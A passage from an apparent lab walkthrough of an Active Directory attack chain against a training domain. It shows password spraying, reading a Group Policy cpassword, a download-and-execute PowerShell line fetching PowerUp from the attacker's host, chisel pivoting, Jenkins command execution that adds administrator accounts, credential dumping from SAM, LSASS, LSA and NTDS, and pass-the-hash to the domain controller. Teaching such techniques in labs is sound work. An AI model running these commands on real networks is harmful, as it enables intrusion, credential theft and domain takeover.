    netexec rdp ips -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Tests the account over RDP.
    
    **Why**RDP answers on the first client, which is the fallback if the shell service is restricted.
    
    Kali
    
    ```
    netexec smb ips -u kpatel -p '100%Mary' --shares
    ```
    
    Copy
    
    Lists the shares on each host with the new account.
    
    **Why**The second client publishes a backup share, and a backup share holds scripts that run on a schedule.
    
    Kali
    
    ```
    netexec smb ips -u kpatel -p '100%Mary' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
    ```
    
    Copy
    
    Walks every share with the new account and downloads what it can read.
    
    **Why**The spider pulls the backup scripts down so they can be read without touching the host again.
    
    **Tip**Spider the shares of every host as soon as you have a new account. A share you cannot read with one account is often readable with another, and the spider finds the difference.
    
16. 16Read the backup scripts and the policy file_1:14:12_
    
    The downloaded backup share holds three files, and all three are generic: a template, a restore guide and a schedule that only names a mailbox. Nothing in them is usable, which is worth knowing before more time goes into them.
    
    The domain-wide policy share on the controller is the better target. The logon script in it is old and still holds a `net use` line with a service account and its password, and the comment says the script is deprecated, which is exactly why nobody removed the credential.
    
    The group policy folder next to it is the classic check. A recursive text search for the cached password attribute finds one match inside a group preference file, and the file names a group membership and the encrypted password of the account it adds.
    
    Kali
    
    ```
    cd 10.0.2.27/Backup-Scripts/
    ```
    
    Copy
    
    Changes into the downloaded backup share of the second client.
    
    **Why**The share copy is on our machine, so reading it costs nothing on the target.
    
    Kali
    
    ```
    rm -r 10.0.0.*
    ```
    
    Copy
    
    Deletes the older download folder from the first address range.
    
    **Why**Only the current loot should stay in the folder, and the stale copy is from before the address change.
    
    Kali
    
    ```
    cat backup-template.ps1
    cat restore-guide.txt
    cat schedule.txt
    ```
    
    Copy
    
    Prints the three backup files in one go.
    
    **Why**Three short files are read in one command, and the result is that none of them holds a credential.
    
    Kali
    
    ```
    cat update-agents.bat
    ```
    
    Copy
    
    Prints the logon script from the policy share of the controller.
    
    **Why**A logon script that maps a share has to authenticate, and a deprecated one still has the credential in it.
    
    Kali
    
    ```
    cd SYSVOL
    ls
    cd hack-academy.local
    ls
    cd Policies
    ls
    ```
    
    Copy
    
    Walks down to the policy folder and lists the group policy objects.
    
    **Why**The preference files that hold cached passwords live under this path, one folder per policy.
    
    Kali
    
    ```
    grep -r cpassword .
    ```
    
    Copy
    
    Searches every file under the policy folder for the cached password attribute.
    
    **Why**The attribute is a known field, so one grep over the folder finds the file that holds a password.
    
    Kali
    
    ```
    cd '{F82E0F7A-E4F5-483E-8903-C80A1212F069}/User/Preferences/Groups/'
    ```
    
    Copy
    
    Changes into the folder the search named.
    
    **Why**The match names the exact policy, and the path is the one the search printed.
    
    Kali
    
    ```
    cat Groups.xml
    ```
    
    Copy
    
    Prints the group preference file.
    
    **Why**The file names the account added to the local administrators group and holds its encrypted password.
    
    **Tip**Search the policy share of every domain controller for the cached password attribute. A deleted or deprecated script in the logon folder is the other half of the same habit.
    
17. 17Move to the second client with WinRM_1:21:08_
    
    The account is checked on the three hosts again, now from the chain folder, and the WinRM check confirms the second client is the only host where it returns an administrative result. The shell opens on that client and the identity is confirmed.
    
    The token is a plain user with no administrative group, which is expected: WinRM access on this host comes from a remote management membership, not from a local administrator group. A listener listing is the important part of the enumeration, because the application we have been reading about listens only on the loopback address of this machine.
    
    Kali
    
    ```
    netexec smb ips -u kpatel -p pass
    ```
    
    Copy
    
    Sprays the three hosts with the password file and keeps the hits.
    
    **Why**The listing shows which host accepts the account and where it is administrative.
    
    Kali
    
    ```
    netexec winrm ips -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Tests WinRM on the three hosts for the account.
    
    **Why**One administrative result on the second client is the way onto that machine.
    
    Kali
    
    ```
    evil-winrm -i 10.0.2.27 -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Opens a remote PowerShell session on the second client.
    
    **Why**The session is the working shell on the host where the internal application runs.
    
    CLIENT-2 (WinRM)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints the host name of the machine.
    
    **Why**The name confirms the shell is on the second client and not on the first.
    
    CLIENT-2 (WinRM)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups and privileges of the session.
    
    **Why**A plain user token explains why the next escalation has to come from the application rather than from the account.
    
    CLIENT-2 (WinRM)
    
    ```
    netstat -ano | findstr /i listening
    ```
    
    Copy
    
    Lists the listening sockets with their process ids.
    
    **Why**One service listens on the loopback address only, which means it cannot be reached from the tunnel and has to be forwarded.
    
    **Tip**A service bound to the loopback address is invisible to every scan, internal or not. Look for the listening list on the host itself, not for open ports from outside.
    
18. 18Forward the localhost service through the client_1:23:40_
    
    The application we read about in the configuration file runs on the second client and listens only on the loopback interface. Our tunnel ends at the first client, which cannot reach that port either, so the connection needs a second hop. The tool for that is a single binary that opens a reverse tunnel: the server runs on the first client, which both machines can reach, and the client runs on the second and forwards the loopback port to it.
    
    The privilege check on the second client reports nothing we can use, so the application is the path. A netcat listener and a web server are already running from earlier work, and a Jenkins listener on the loopback port is confirmed by the socket list and by the password file we read from its folder.
    
    The forwarded port answers on the first client, and the login page asks for the initial administrator password, which is the file we just read. The application is now a route to a service account with more rights than our user.
    
    Kali
    
    ```
    cd ../privesc
    ```
    
    Copy
    
    Moves to the privilege escalation tools.
    
    **Why**The server binary for the forward is in this folder, and the web server publishes it.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the tools over HTTP on port 80.
    
    **Why**The second client downloads the tools from us, so they have to be published.
    
    CLIENT-2 (WinRM)
    
    ```
    wget -useb 10.0.0.30/PowerUp.ps1|iex;Invoke-AllChecks
    ```
    
    Copy
    
    Downloads the privilege check and runs every check.
    
    **Why**The check is worth one run before the application, in case the host has an easier path.
    
    CLIENT-2 (WinRM)
    
    ```
    upload /opt/tools/pivoting/chisel.exe .
    ```
    
    Copy
    
    Uploads the tunnelling binary into the user profile.
    
    **Why**The binary has to be on the second client, and the profile folder is writable without administrative rights.
    
    CLIENT-1 (WinRM)
    
    ```
    cd c:\windows\tasks
    ```
    
    Copy
    
    Changes to the tasks folder on the first client.
    
    **Why**The server half of the forward runs on the machine that both networks reach.
    
    CLIENT-1 (WinRM)
    
    ```
    ./chisel.exe server -p 7070 --reverse
    ```
    
    Copy
    
    Starts the forward server with reverse tunnelling on port 7070.
    
    **Why**The server listens on the internal address of the first client, which the second client can reach.
    
    CLIENT-2 (WinRM)
    
    ```
    netstat -ano
    ```
    
    Copy
    
    Lists the listening sockets on the second client.
    
    **Why**The loopback port of the application is visible here, and nothing else listens on it.
    
    CLIENT-2 (WinRM)
    
    ```
    ./chisel.exe client 10.0.2.26:7070 R:7071:localhost:8080
    ```
    
    Copy
    
    Connects the forward client and maps the loopback application port to a port on the first client.
    
    **Why**The reverse tunnel carries the loopback port out through the first client, which is the only machine that can reach both sides.
    
    CLIENT-2 (WinRM)
    
    ```
    type C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
    ```
    
    Copy
    
    Prints the initial administrator password of the application.
    
    **Why**The password file is on disk and readable, and the login page asks for exactly this value.
    
    **Tip**For a loopback-only service, the forward has to run from the machine that hosts it. A tunnel to the subnet is not enough, because the port is not on the subnet.
    
19. 19Run commands through a build job_1:51:00_
    
    The application is a build server, and the unlocked administrator account can create a job that runs a shell command. A build step that executes Windows commands runs them as the account the service runs under, which on this install is more privileged than our user.
    
    A job called appa is created with one build step of the type that runs a Windows batch command. Its first command is `net localgroup administrators kpatel /add`, which adds our domain account to the local administrators of the machine, and it is saved and built. The build runs and the group change is confirmed from our shell with the local account list.
    
    Two more lines run in the same step afterwards: `net user test Password123! /add` creates a local test account, and `net localgroup administrators test /add` puts it in the same group. That second change proves the step runs with administrative rights and leaves an account behind that does not depend on the domain.
    
    The identity check inside our session still says the domain account, because the job ran in a different process. The token check after the group change shows the privileges that came with the new membership.
    
    CLIENT-2 (WinRM)
    
    ```
    net user test
    ```
    
    Copy
    
    Prints the local test account and its group memberships.
    
    **Why**The membership line names both the administrators group and the users group, which confirms the build step worked.
    
    CLIENT-2 (WinRM)
    
    ```
    net user kpatel
    ```
    
    Copy
    
    Tries to print the domain account with the local user tool.
    
    **Why**The account is not local, so the local tool cannot find it; the message is a reminder of which database each tool reads.
    
    CLIENT-2 (WinRM)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the groups and privileges of the session after the group change.
    
    **Why**The privilege list now carries the debugging and impersonation rights that come with the administrative membership.
    
    **Tip**A build server that runs commands is a shell with the service account's rights. Look at how the service runs before you look for a bug in the application.
    
20. 20Dump the second client's secrets_1:55:12_
    
    With the group membership in place, the same account is administrative on the second client over the network, and the routine is the one used on the first: a remote command to confirm the context, then the local hashes, the logon process memory and the LSA secrets.
    
    The local hashes include a new local account, and the LSA secrets hold the machine keys and a cached logon for a local user. The logon scan finds a cached ticket for that user, which is another password to try offline. The local user list is read as well, because a description next to a local account is as good a hint as one in the domain.
    
    Kali
    
    ```
    netexec smb ips -u kpatel -p '100%Mary'
    ```
    
    Copy
    
    Tests the account on the three hosts after the group change.
    
    **Why**The second client now answers with an administrative result, which is the proof that the build step changed the machine.
    
    Kali
    
    ```
    netexec smb ips -u kpatel -p '100%Mary' -X 'whoami /all'
    ```
    
    Copy
    
    Runs an identity check on the host remotely.
    
    **Why**The command runs on the target, so the output shows the context the remote service uses, not our shell.
    
    Kali
    
    ```
    netexec smb 10.0.2.27 -u kpatel -p '100%Mary' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from the second client.
    
    **Why**The local hashes include accounts created on the machine, which are worth cracking for reuse.
    
    Kali
    
    ```
    netexec smb 10.0.2.27 -u kpatel -p '100%Mary' -M nanodump
    ```
    
    Copy
    
    Dumps the memory of the logon process to a file.
    
    **Why**The dump is the fallback when the registry stores hold nothing in clear.
    
    Kali
    
    ```
    netexec smb 10.0.2.27 -u kpatel -p '100%Mary' -M lsassy
    ```
    
    Copy
    
    Runs a module that reads credentials from the logon process.
    
    **Why**The module reports cached tickets for the local accounts, which is a password to attack offline.
    
    Kali
    
    ```
    netexec smb 10.0.2.27 -u kpatel -p '100%Mary' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets from the second client.
    
    **Why**The machine keys and the cached logons are in this store, and the cache names the account that last used the machine.
    
    Kali
    
    ```
    netexec smb 10.0.2.27 -u kpatel -p '100%Mary' --users
    ```
    
    Copy
    
    Prints the local user table of the second client.
    
    **Why**The descriptions next to local accounts often hold a hint or a temporary password.
    
    Kali
    
    ```
    netexec smb 10.0.2.100 -u kpatel -p '100%Mary' --users
    ```
    
    Copy
    
    Prints the user table of the controller.
    
    **Why**Run against the controller, the same command lists domain accounts, and their descriptions are the next lead.
    
    **Tip**Read the description column of the local user table on every host. It is written by administrators for administrators, and it is not protected like a password store.
    
21. 21Try the temporary password from a description_2:00:24_
    
    The user table from the controller carries a description for a monitoring service account that says the temporary password is a single word and that a reset is required. Two attempts with that word fail, the second with a stray character appended, and the wording is the reason: the account has to change the password before it can be used, and a service account cannot do that itself.
    
    The account is not worth more time while the search for files goes on. On the second client the same disk search runs again with the local account names added to the pattern, and after a few exclusions the useful line appears: a backup script under the scripts folder names a service account in the administrator group.
    
    Kali
    
    ```
    netexec smb 10.0.2.100 -u kpatel -p '100%Mary' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$5}' | tee users
    ```
    
    Copy
    
    Writes the user names from the controller into a file.
    
    **Why**The search pattern needs the names of this domain, and the file is built once from the table.
    
    Kali
    
    ```
    paste -sd, users | sed 's/[^,]*/"&"/g'
    ```
    
    Copy
    
    Turns the name list into a quoted comma separated list.
    
    **Why**The pattern is a list of quoted names, and building it by hand invites a typo.
    
    CLIENT-2 (WinRM)
    
    ```
    Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\Windows|C:\\Documents and Settings\\|C:\\Program Files\\VMware\\|C:\\Program Files\\Windows|C:\\Program Files\\Jenkins|C:\\ProgramData\\Application|Jenkins)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=","Administrator","svc_webapi","svc_admin","svc_reports","svc_legacy","svc_monitor","svc_update","eturner","kpatel"
    ```
    
    Copy
    
    Searches the disk of the second client for configuration and script files that mention a password or an account name.
    
    **Why**The same search as on the first client, with the local names added, and this one names a backup script that holds a service account.
    
    **Tip**A description that says reset required is still a valid password. Changing it is a second step, and on a service account the change may not be allowed at all.
    
22. 22Read the backup script and take the domain_2:27:08_
    
    The scripts folder at the root of the second client holds a single backup script, and the script hardcodes a service account that belongs to the domain administrators. The password is written next to it because the script has to authenticate to the controller share.
    
    The credential is tested against the whole list, and it answers as an administrative result on all three hosts, which is the signature of a domain administrator. A remote command confirms the group membership on the controller, and the enumeration of the domain database then prints every hash in the domain, including the Administrator.
    
    The Administrator hash is enough to open a remote shell on the controller without a password, and the identity check there is the end of the chain.
    
    CLIENT-2 (WinRM)
    
    ```
    ls c:\
    ```
    
    Copy
    
    Lists the root of the system drive.
    
    **Why**The script folder is a non-default folder at the root, and it is the one the search named.
    
    CLIENT-2 (WinRM)
    
    ```
    ls -Force c:\
    ```
    
    Copy
    
    Lists the root including hidden and system items.
    
    **Why**Hidden folders are where a backup tool keeps its state, so the forced listing is worth one line.
    
    CLIENT-2 (WinRM)
    
    ```
    cd c:\scripts
    ```
    
    Copy
    
    Changes into the scripts folder.
    
    **Why**The folder holds the script that the search matched, and it is readable with our account.
    
    CLIENT-2 (WinRM)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the scripts folder.
    
    **Why**One file, and the name says it is a backup sync, which is a script that has to authenticate somewhere.
    
    CLIENT-2 (WinRM)
    
    ```
    cat *
    ```
    
    Copy
    
    Prints the backup script in full.
    
    **Why**The script holds a service account and its password in clear, and the account is a domain administrator.
    
    Kali
    
    ```
    netexec smb ips -u svc_admin -p pass --continue
    ```
    
    Copy
    
    Sprays the password file against the new account.
    
    **Why**One line in the file is the password from the script, and the result is an administrative answer on all three hosts.
    
    Kali (gedit)
    
    ```
    gedit pass2
    ```
    
    Copy
    
    The file pass2 holds the single password that works.
    
    **Why**A password that starts with a dash would be read as a flag on the command line, so it goes into a file instead.
    
    Kali
    
    ```
    netexec smb 10.0.2.100 -u svc_admin -p pass2
    ```
    
    Copy
    
    Tests the account against the controller with the password file.
    
    **Why**The administrative answer on the controller is the proof that the account is a domain administrator.
    
    Kali
    
    ```
    netexec smb 10.0.2.100 -u svc_admin -p pass2 -X 'whoami /all'
    ```
    
    Copy
    
    Runs an identity check on the controller with the same credential.
    
    **Why**The group list names the domain administrators group, which is what the rest of the chain relies on.
    
    Kali
    
    ```
    netexec smb 10.0.2.100 -u svc_admin -p pass2 --ntds
    ```
    
    Copy
    
    Dumps the domain database from the controller.
    
    **Why**The account is a domain administrator, so the replication read returns every hash in the domain.
    
    Kali
    
    ```
    impacket-psexec hack-academy.local/administrator@10.0.2.100 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
    ```
    
    Copy
    
    Opens a remote shell on the controller as Administrator using the hash.
    
    **Why**The hash authenticates without the password, which gives the highest account on the controller.
    
    DC01 (psexec)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the identity of the new shell.
    
    **Why**The answer is the system account on the controller, which is the end of the chain.
    
    **Tip**A password that begins with a dash cannot be passed on the command line. Write it into a file and give the tool the file, or it will be read as an option.

